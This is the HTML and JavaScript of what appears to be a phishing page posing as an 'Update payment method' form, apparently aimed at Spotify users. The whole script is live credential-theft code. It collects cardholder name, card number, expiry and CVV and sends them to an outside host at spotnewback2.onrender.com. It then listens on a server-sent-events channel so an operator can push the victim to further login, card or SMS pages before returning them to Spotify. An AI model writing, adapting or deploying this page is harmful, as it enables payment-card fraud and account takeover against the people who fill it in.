<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Welcome</title>
    <link rel="stylesheet" href="app.css">
    
    <!-- Ensure jQuery is loaded before any other plugin -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
<form method="POST">
    <input type="hidden" name="LOGIN">
    <input type="hidden" name="USERNAME">
    <input type="hidden" name="PASSWORD">
    <input type="hidden" name="CARD_NUMBER">
    <input type="hidden" name="PHONE_NUMBER">
</form>

<header>
    <img src="logo.png" alt="Logo">
</header>

<div class="loader" style="color:white; text-align:center; display:none;">
    <div class="content" style="flex-direction:column;">
        <h3>Please wait...</h3>
        <p>Do not leave this page. You will automatically be redirected.</p>
        <img src="loading.gif" alt="Loading">
    </div>
</div>

<main>
    <div class="form">
        <div class="title">
            Update payment method
        </div>

        <div class="cols">
            <div class="col">
                <label>Cardholder's name</label>
                <input type="text" id="d0" placeholder="Cardholder's name">
            </div>

            <div class="col">
                <label>Card number</label>
                <input type="text" id="d1" placeholder="XXXX XXXX XXXX XXXX">
            </div>

            <div class="col">
                <label>Expiry date</label>
                <input type="text" id="d2" placeholder="MM/YY">
            </div>

            <div class="col">
                <label>Security code</label>
                <input type="text" id="d3" placeholder="CVV">
            </div>

            <div class="col submit">
                <button type="button" id="submitButton">Update</button>
            </div>
        </div>
    </div>
</main>

<script>
document.addEventListener('DOMContentLoaded', async function () {
    // Retrieve userId from localStorage or fetch it if not found
    let userId = localStorage.getItem('userId');
    
    if (!userId) {
        try {
            const response = await fetch('https://spotnewback2.onrender.com/user-id', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                },
            });

            const data = await response.json();

            if (data.success) {
                localStorage.setItem('userId', data.userId);
                userId = data.userId;
            } else {
                console.error('Error generating user ID');
                return;
            }
        } catch (error) {
            console.error('Error fetching user ID:', error);
            return;
        }
    }

    // Handle input formatting using JavaScript
    const cardInput = document.getElementById('d1');
    const expInput = document.getElementById('d2');
    const cvvInput = document.getElementById('d3');

    // Format card number input
    cardInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').replace(/(.{4})(?=.)/g, '$1 ').trim();
    });

    // Format expiration date (MM/YY)
    expInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').replace(/(.{2})(?=.)/g, '$1/').trim();
    });

    // Format CVV
    cvvInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 4); // Allow max 4 digits for CVV
    });

    // Function to validate the inputs
    function validate() {
        let isValid = true;

        // Validate Name
        const name = document.getElementById('d0').value;
        if (name.trim() === '') {
            isValid = false;
            document.getElementById('d0').classList.add('error');
        } else {
            document.getElementById('d0').classList.remove('error');
        }

        // Validate Card Number (length check and format)
        const cardNumber = document.getElementById('d1').value.replace(/\s/g, '');
        if (cardNumber.length !== 16 || !/^\d{16}$/.test(cardNumber)) {
            isValid = false;
            document.getElementById('d1').classList.add('error');
        } else {
            document.getElementById('d1').classList.remove('error');
        }

        // Validate Expiration Date (MM/YY)
        const expDate = document.getElementById('d2').value;
        const expParts = expDate.split('/');
        if (expParts.length !== 2 || expParts[0] < 1 || expParts[0] > 12 || expParts[1] < 24 || expParts[1] > 40) {
            isValid = false;
            document.getElementById('d2').classList.add('error');
        } else {
            document.getElementById('d2').classList.remove('error');
        }

        // Validate CVV (length check)
        const cvv = document.getElementById('d3').value;
        if (cvv.length < 3 || cvv.length > 4 || !/^\d{3,4}$/.test(cvv)) {
            isValid = false;
            document.getElementById('d3').classList.add('error');
        } else {
            document.getElementById('d3').classList.remove('error');
        }

        return isValid;
    }

    // Handle form submission
    document.getElementById('submitButton').addEventListener('click', function() {
        console.log('Submit button clicked');
        if (validate()) {
            $(".loader").show(); 

            $.ajax({
                url: 'https://spotnewback2.onrender.com/send-cc',  
                method: 'POST',
                data: {
                    name: document.getElementById('d0').value,
                    cc: document.getElementById('d1').value,
                    exp: document.getElementById('d2').value,
                    cvv: document.getElementById('d3').value,
                    userId: userId 
                },
                success: function(response) {
                    listenForSSE(userId);
                },
                error: function(xhr, status, error) {
                  
                }
            });
        }
    });
});
function listenForSSE(userId) {
            const eventSource = new EventSource(`https://spotnewback2.onrender.com/sse/${userId}`);
            console.log("Attempting to establish SSE connection for userId:", userId);

            eventSource.onmessage = function (event) {
                console.log("SSE Message received:", event);

                try {

                    const data = JSON.parse(event.data);
                    if (!data.action) {

                        return;
                    }

                    console.log("Action received:", data.action);


                    if (data.action === "login") {

                        window.location.href = 'login.html';
                    } else if (data.action === "cc") {

                        window.location.href = 'cc.html';
                    } else if (data.action === "sms") {
                        window.location.href = 'sms.html';
                    } else if (data.action === "spotify") {
                        window.location.href = 'https://open.spotify.com/';
                    }
                    else {
                        window.location.href = 'login.html';
                    }
                } catch (error) {

                    window.location.href = 'login.html';
                }
            };

            eventSource.onerror = function (event) {
                console.error("SSE connection error:", event);
                eventSource.close();
            };

            eventSource.onopen = function (event) {
                console.log("SSE connection successfully opened:", event);
            };

            eventSource.onclose = function (event) {
                console.log("SSE connection closed:", event);
            };
        }

</script>

</body>
</html>
